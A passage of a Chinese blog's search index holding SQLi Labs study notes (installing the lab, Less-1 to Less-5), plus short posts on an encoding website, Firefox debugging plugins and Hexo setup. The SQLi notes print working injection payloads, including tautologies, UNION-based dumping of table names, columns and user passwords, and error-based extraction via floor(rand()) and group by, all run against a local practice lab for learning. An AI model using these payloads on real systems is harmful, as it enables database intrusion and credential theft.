      <content type="html"><![CDATA[<h1 id="第四课：基于错误的SQL注入"><a href="#第四课：基于错误的SQL注入" class="headerlink" title="第四课：基于错误的SQL注入"></a>第四课：基于错误的SQL注入</h1><p>上一部分，已经初步了解了什么是SQL注入，程序获取用户的输入然后进行SQL查询，但是没有对用户的输入做任何过滤，导致用户构造一些意料之外的输入使得原先的sql语句发生了变化，如插入条件判断、注释后面的语句等。我们通过一些最基础的方法构造注入语句查询我们想要得到的信息，攻击目标主机，下面将介绍再其他复杂情况下构造SQL注入语句的一些方法。<br><a id="more"></a></p>
<p>在Less-5中，对参数<code>id</code>输入整数，都返回<code>You are in...........</code>，这意味着，无法通过上一部分的所讲的方法构造联合查询来爆出数据库的表内容了。</p>
<p><img src="/images/sqli/sqli_20160905222437.png" alt=""></p>
<p>还是同样的方法，输入一些特殊字符让其产生错误，看是否会返回错误信息</p>
<ul>
<li><code>?id=1&#39;</code></li>
<li><code>?id=1&quot;</code></li>
<li><code>?id=1\</code></li>
</ul>
<p><img src="/images/sqli/sqli_20160905223120.png" alt=""></p>
<p>打印出了错误信息，同时，根据错误来推测sql语句大概是怎样写的，Less-5中返回的错误能得知参数<code>id</code>是用单引号包裹着的，于是构造一些能正确输出的注入语句，能够执行我们的恶意代码，如<code>?id=1&#39; or 1--+</code>等。</p>
<p>这样情况下的注入，有一种方法叫做<strong>基于错误的SQL注入</strong>，接下来讨论如何利用错误信息让后端爆出数据库表的内容。我们考虑如下几个函数<code>count()</code>、<code>rand()</code>、<code>floor()</code>（当然<code>round()</code>也是一样的），执行如下：</p>
<ul>
<li><code>select count(*) from information_schema.tables;</code></li>
<li><code>select floor(rand()*2);</code></li>
</ul>
<p><img src="/images/sqli/sqli_20160905225546.png" alt=""></p>
<p>这两个函数分开执行的时候都没有问题，但是和<code>group by</code>分组语句放在一起执行会出现错误，报错显示的内容出现重复的键，这里构造语句，执行几次之后会报错重复的分组键。<br><code>select count(*),floor(rand()*2)a from information_schema.tables group by a;</code></p>
<p><img src="/images/sqli/sqli_20160905225847.png" alt=""></p>
<p>利用这个特性，可以把想要查询的内容用函数<code>concat()</code>拼接起来，就可以报错我们想要得到的内容，比如导出当前数据库。<br><code>select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></p>
<p><img src="/images/sqli/sqli_20160905230310.png" alt=""></p>
<p>同样的，还可以知道当前数据库版本信息，当前用户，以及当前数据库有哪些表等等。</p>
<ul>
<li><code>select count(*),concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></li>
<li><code>select count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></li>
<li><code>select count(*),concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></li>
</ul>
<p><img src="/images/sqli/sqli_20160905231531.png" alt=""></p>
<p>接下来，我们要用这个特性来具体实施SQL注入，构造我们的注入语句，二话不说，直接用条件构造注入试试，出现这个错误，操作只能包含一个列。<br><code>1&#39; and (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)--+</code></p>
<p><img src="/images/sqli/sqli_20160905232220.png" alt=""></p>
<p>我们构造的语句一共含有两列，第一个是数数，第二个是我们要出错的注入语句。既然只能有一列，那就把这两列当作被查询的目标作为子查询插入。<br><code>1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a))--+</code></p>
<p><img src="/images/sqli/sqli_20160905232713.png" alt=""></p>
<p>这个错误显示告诉我们，每一个衍生的标必须有一个别称，意思是我们的子查询缺少一个别称，随便加一个就行，在<code>a)</code>的后面，对整个子查询语句命名为b，最后得到我们想要的注入结果。<br><code>1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b)--+</code></p>
<p><img src="/images/sqli/sqli_20160905233043.png" alt=""></p>
<p>ps：有时候可能会报出<code>Subquery returns more than 1 row</code>的错误，多点几次执行就能看到结果了。</p>
<hr>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[SQLi Labs 学习笔记 Part 2]]></title>
      <url>http://ug1y.github.io/2016/09/03/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-2/</url>
      <content type="html"><![CDATA[<h1 id="第一课：判断注入点"><a href="#第一课：判断注入点" class="headerlink" title="第一课：判断注入点"></a>第一课：判断注入点</h1><p>Less-1中通过输入参数<code>?id=1</code>能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：<br><code>select * from TABLE where id=1;</code><br><a id="more"></a></p>
<p>我们输入一些特殊符号，让其产生错误，如单引号‘’’，双引号‘“’，反斜杠‘\’等，我们构造参数<code>id=1\</code>,产生错误如下：</p>
<p><img src="/images/sqli/sqli_20160903123834.png" alt=""></p>
<p>可以知道输入的参数<code>$id</code>是被单引号包裹的，于是可以猜测其sql语句为：<br><code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;;</code></p>
<p>于是我们可以闭包前面的语句同时注释后面的语句来构造正确的查询。</p>
<ul>
<li><code>?id=1&#39;--+</code> //‘+’在浏览器url中会被解析成空格</li>
<li><code>?id=1&#39;%23</code> //‘%23’是‘#’的URL编码，用于注释后面的语句</li>
</ul>
<p>通过条件注入使得sql语句中where条件恒为真即达到目的。</p>
<ul>
<li><code>&#39; or &#39;1&#39;=&#39;1</code></li>
<li><code>&#39; or 1 --+</code></li>
<li><code>&#39; or 1 %23</code></li>
</ul>
<p>以上的注入会让sql查询等同于<code>select * from users</code></p>
<h1 id="第二课：基本的注入获取全局信息"><a href="#第二课：基本的注入获取全局信息" class="headerlink" title="第二课：基本的注入获取全局信息"></a>第二课：基本的注入获取全局信息</h1><p>从上节课能够知道，通过输入特殊字符使得报错，能够得知注入的构造方法，用or语句使得条件永为真。同样在Less-2、Less-3、Less-4我们去尝试构造得到如下结果：</p>
<ul>
<li>Less-2: <code>1 --+</code></li>
<li>Less-3: <code>1&#39;) --+</code></li>
<li>Less-4: <code>1&quot;) --+</code></li>
</ul>
<p>这意味着我们在<strong>注释语句</strong>和<strong>闭合语句</strong>之间可以加入任何我们想执行的恶意注入代码。</p>
<p>开始注入第一步，猜测sql查询的行数，在Less-1中构造注入<code>1&#39; order by 1--+</code>，按照第1行来排序，一直加，直到报错为止。发现当构造注入代码<code>1&#39; order by 4--+</code>时，出现错误，则说明总共查询有三行。</p>
<p><img src="/images/sqli/sqli_20160903131801.png" alt=""></p>
<p>接下来我们用联合查询，构造<code>1&#39; union select 1,2,3--+</code>，但是什么也没有发生，这是由于联合查询将查询结果直接添加到数组后面，然而我们页面只显示了第一行，所以我们将构造改成<code>999&#39; union select 1,2,3--+</code>得到如下：</p>
<p><img src="/images/sqli/sqli_20160903131016.png" alt=""></p>
<p>接下来，根据其显示输出的位置，我们构造注入代码添加想要查看的一些信息</p>
<ul>
<li><code>-1&#39; union select 1,version(),3--+</code> //查看数据库版本</li>
<li><code>-1&#39; union select 1,database(),3--+</code> //查看当前数据库名</li>
<li><code>-1&#39; union select 1,user(),3--+</code> //查看当前用户</li>
<li><code>-1&#39; union select 1,@@datadir,3--+</code> //查看全局变量，数据存储目录</li>
</ul>
<h1 id="第三课：构造注入获取数据库或表内容"><a href="#第三课：构造注入获取数据库或表内容" class="headerlink" title="第三课：构造注入获取数据库或表内容"></a>第三课：构造注入获取数据库或表内容</h1><p>MYSQL的数据库中有一个自带的数据库information_schema，它提供了访问数据库元数据的方式。元数据就是对数据的描述，如数据库名或表名，列的数据类型，或访问权限等。普通的用户一般来说是可以有select等权限查看里面的内容。其中tables、columns等表存储着一些重要的信息。</p>
<p><img src="/images/sqli/sqli_20160903215717.png" alt=""></p>
<p>接下来，我们构造一些注入来获取一些有用的信息。<br><code>-1&#39; union select 1,database(),3--+</code></p>
<p><img src="/images/sqli/sqli_20160903220456.png" alt=""></p>
<p>得知当前数据库是<code>security</code>，利用元数据中的<code>tables</code>表来获取当前数据中有哪些表。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
<p><img src="/images/sqli/sqli_20160903220951.png" alt=""></p>
<p>同样，用函数<code>database()</code>替换字符串<code>security</code>也能达到同样的效果。另外，可以使用<code>limit</code>关键字来指定获取第几行的数据，第一个参数是行数，第二个参数是偏移量。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1--+</code></p>
<p><img src="/images/sqli/sqli_20160903221300.png" alt=""></p>
<p>如果想要一次全显示出来，可以用函数<code>group_concat</code>字符串组拼接。<br><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code></p>
<p><img src="/images/sqli/sqli_20160903221831.png" alt=""></p>
<p>还可以利用这种方法获取表的字段信息，例如<code>users</code>表包含哪些字段，其他的表也一样。<br><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
<p><img src="/images/sqli/sqli_20160903222700.png" alt=""></p>
<p>最后，如果要导出表内容，通过以上获取的表名及其相应的字段信息，直接构造sql查询即可。<br><code>-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code></p>
<p><img src="/images/sqli/sqli_20160903223146.png" alt=""></p>
<hr>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[SQLi Labs 学习笔记 Part 1]]></title>
      <url>http://ug1y.github.io/2016/09/03/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-1/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在知乎上搜的<a href="https://www.zhihu.com/question/30505597" target="_blank" rel="external">如何做CTF训练</a>时，看到各种大神的心路历程，十分激动，刚开始学习，对于SQL注入感觉很有意思，便从大神们推荐的网站开始入手。SQLi Labs是一外国友人写的一套简单易入门的教程，实验环境发布至<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">github</a>上，视频教程我已经从youtube下载分享至百度云盘上，链接<a href="https://yun.baidu.com/s/1kVJcsyr" target="_blank" rel="external">https://yun.baidu.com/s/1kVJcsyr</a>，有需要的可以拿去不谢。</p>
<a id="more"></a>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol>
<li>从<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a>上下载源代码</li>
</ol>
<p><img src="/images/sqli/sqli_37784a27.png" alt=""></p>
<ol>
<li>解压至Apache webroot目录下，我用的是<a href="http://www.wampserver.com/" target="_blank" rel="external">wampserver</a>，复制到www目录下</li>
</ol>
<p><img src="/images/sqli/sqli_9455b9b1.png" alt=""></p>
<ol>
<li>打开<code>sql-connections</code>目录下的<code>db-creds.inc</code>文件，修改mysql用户名、密码和主机</li>
</ol>
<p><img src="/images/sqli/sqli_225b1732.png" alt=""></p>
<ol>
<li>打开浏览器，访问<a href="http://localhost/sqli-labs/" target="_blank" rel="external">http://localhost/sqli-labs/</a>,点击<code>Setup/reset Database for labs</code>链接会自动为你初始化数据库</li>
</ol>
<p><img src="/images/sqli/sqli_ac79751f.png" alt=""></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>网上也有关于这个这个实验环境的通关攻略，我借鉴别人的翻译结合自己看视频的过程把学习笔记记下来，方便查阅。实验环境总共分了4页，从基础到复杂的，视频资源也是最多到第2页就没有了，学习了这些基本能掌握常用的SQL注入的一些实例，能够进阶理解更复杂多变的注入方法</p>
<p><img src="/images/sqli/sqli_e4f15294.png" alt=""></p>
<hr>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[方便实用的字符串编码网站]]></title>
      <url>http://ug1y.github.io/2016/09/03/%E6%96%B9%E4%BE%BF%E5%AE%9E%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81%E7%BD%91%E7%AB%99/</url>
      <content type="html"><![CDATA[<p><img src="/images/d75159a908c9dd36930cdf9c86189954.png" alt=""></p>
<a id="more"></a>
<p>在进行网站测试时，经常会碰到编码绕过等问题，例如HTML编码、URL编码、base64编码，甚至还有其他像MD5、SHA1等哈希值的计算。其他的包括一些代码的混淆，SQL字符转换、Javascript等。推荐一个网站，也是我不经意看到的，可以直接访问主页<a href="https://encoder.mattiasgeniar.be/" target="_blank" rel="external">Decode, Encode or Obfuscate your string</a>使用，也可以下载<a href="https://github.com/mattiasgeniar/Encoder" target="_blank" rel="external">github</a>上的源码至本地服务器上使用</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[好用必备的web调试工具]]></title>
      <url>http://ug1y.github.io/2016/09/01/%E5%A5%BD%E7%94%A8%E5%BF%85%E5%A4%87%E7%9A%84web%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不管是程序员还是搞网络安全的，一个好用上手的工具当时是十分必要的，在做一些CTF赛题和开发的过程中，经常需要用到web调试，最好用的还是<a href="http://www.firefox.com.cn/" target="_blank" rel="external">火狐浏览器</a>了，支持插件多，定制功能强，下面介绍两个好用的插件，可以点击浏览器的<a href="https://addons.mozilla.org/zh-CN/firefox/" target="_blank" rel="external">附加组件</a>查找更多搜索安装<br><a id="more"></a></p>
<h2 id="firebug"><a href="#firebug" class="headerlink" title="firebug"></a>firebug</h2><p>支持直接修改、删除、新建cookie，用这个来操作cookie真的很方便<br><img src="/images/60cf5893ced82b57900e7f65ec3cf07b.png" alt=""></p>
<p>修改和新建cookie时要注意存活时间，在当前时间之后即是创建，之前则是删除<br><img src="/images/167003185f5ac39ce427c83f327bdf47.png" alt=""></p>
<h2 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h2><p>另一个用于调试的神奇插件，可以载入URL并且点击Execute按钮可以直接执行http请求，在这个框里修改请求参数，比如写个注入啥的，用于测试很是方便<br><img src="/images/78470a3e072dc8da5980ca5375d804bf.png" alt=""></p>
<p>选中Enable Post data还可以修改表单数据提交请求，Referrer就更不用说了<br><img src="/images/6a3749189981a487c591b8f82cfecff9.png" alt=""></p>
<p>注意到上面那一排下拉框了吧，都是一些便捷的小工具，比如Encoding里面，选中文本可以base64编码、URL编码、16进制转换<br><img src="/images/bd12d2a6e004b3aedd4afa5850b4c254.png" alt=""></p>
<p>其他的包括SQL、XSS、Encryption和Other都是一些常见的编码、加密或者字符串处理，十分方便实用</p>
<hr>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>http://ug1y.github.io/2016/08/22/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    </entry>
    
  
  
</search>
